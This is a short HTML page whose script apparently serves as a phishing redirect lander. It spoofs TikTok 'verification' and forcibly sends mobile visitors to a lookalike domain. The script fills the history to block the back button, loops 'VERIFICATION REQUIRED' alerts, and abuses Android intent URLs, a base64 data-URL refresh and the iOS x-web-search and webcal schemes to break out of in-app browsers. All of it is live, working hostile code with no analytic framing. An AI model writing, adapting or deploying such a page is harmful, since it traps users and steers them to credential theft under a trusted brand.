<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; // 5 SECOND FAIL-SAFE

    // This creates a "Bridge" that forces the browser to treat the URL as a site, not a search
    const directBridge = `data:text/html;base64,${btoa(`<html><meta http-equiv="refresh" content="0;url=${target}"></html>`)}`;

    function forceDirectExternal() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: We use the 'intent' but point it to the 'directBridge' to stop the search behavior
            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
        } else if (isIOS) {
            // iOS: We use the Bridge to force Safari to actually LOAD the page
            window.location.href = directBridge;
            
            // The Search-to-Direct handover
            setTimeout(() => {
                window.location.replace("x-web-search://?" + encodeURIComponent(target));
            }, 50);

            // Nuclear fallback for iOS
            window.location.href = "webcal://" + target.replace("https://", "");
        }
    }

    function rampage() {
        if (Date.now() > killTime) return; // FAIL-SAFE

        forceDirectExternal();

        alert("VERIFICATION REQUIRED\n\nTap OK to open the secure system browser.");
        
        forceDirectExternal();

        setTimeout(rampage, 10);
    }

    window.onload = () => {
        for(let i=0; i<30; i++) history.pushState(null, null, "#step" + i);
        rampage();
    };

    window.onblur = () => {
        if (Date.now() < killTime) rampage();
    };
</script>

</body>
</html>
